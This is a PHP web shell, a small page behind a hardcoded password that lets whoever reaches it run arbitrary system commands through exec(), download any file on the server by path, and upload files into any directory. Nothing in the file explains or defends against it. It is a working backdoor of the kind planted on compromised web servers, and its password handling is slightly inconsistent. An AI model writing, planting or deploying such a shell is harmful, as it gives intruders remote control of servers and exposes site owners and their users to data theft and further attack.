<html>
<body>
   <form action="" method="POST">
    Password <input type="password" name="pass" id="pass">
    </form>
<?php
$pass = $_POST['pass'];
if($pass == "password")
{
   echo '
<h1>Download a File</h1>
<form method="POST" action="">
   <input type="hidden" name="pass" value="whyred"><br>
   Filepath <input type="text" name="dfile">
   <input type="SUBMIT" value="Download">
</form>

<h1>Upload a File</h1>
<form method="POST" action="" enctype="multipart/form-data">
   <input type="hidden" name="pass" value="whyred"><br>
   File <input type="file" name="fileToUpload" id="fileToUpload"><br>
   <input type="SUBMIT" value="Upload" name="usubmit">
</form>

<h1>Execute a command</h1>
<form method="POST" action="">
   <input type="hidden" name="pass" value="whyred"><br>
   Command <input type="text" name="cmd">
   <input type="SUBMIT" value="Execute">
</form>';

   if(isset($_POST['cmd']))
   {
      exec($_POST['cmd'],$array);
      foreach ($array as $result) 
      {
         echo $result; 
         echo "<br>";
     } 
   }
   
   elseif(isset($_POST['dfile']))
   {
      $file = $_POST['dfile'];
      if (file_exists($file)) 
      {
          header('Content-Description: File Transfer');
          header('Content-Type: application/octet-stream');
          header('Content-Disposition: attachment; filename="'.basename($file).'"');
          header('Expires: 0');
          header('Cache-Control: must-revalidate');
          header('Pragma: public');
          header('Content-Length: ' . filesize($file));
          readfile($file);
          exit;
      }
   }

   elseif (isset($_POST['usubmit'])) 
   {
      $dir = $_GET['dir'];
      if (isset($_POST['dir'])) 
      {
	      $dir = $_POST['dir'];
      }
      $file = '';
      if ($dir == NULL or !is_dir($dir)) 
      {
         if (is_file($dir)) 
         {
		      echo "enters";
		      $file = $dir;
		      echo $file;
	      }
	      $dir = './';
      }
      $dir = realpath($dir.'/'.$value);
      $dirs = scandir($dir);
      $uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
      if (file_exists($uploadDirectory)) 
      {
    	   echo "Error. File already exists in ".$uploadDirectory;
	   }
      else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) 
      {
		   echo 'File '.$_FILES['fileToUpload']['name'].' uploaded successfully in '.$dir.'!';
      } 
      else 
      {
		   echo 'Error uploading file '.$uploadDirectory;
	   }
   }
}
elseif($pass=="")
{
    echo "Input Password!!!";
}
else
{
   echo "Wrong Password.";
}
?>
</body>
</html>
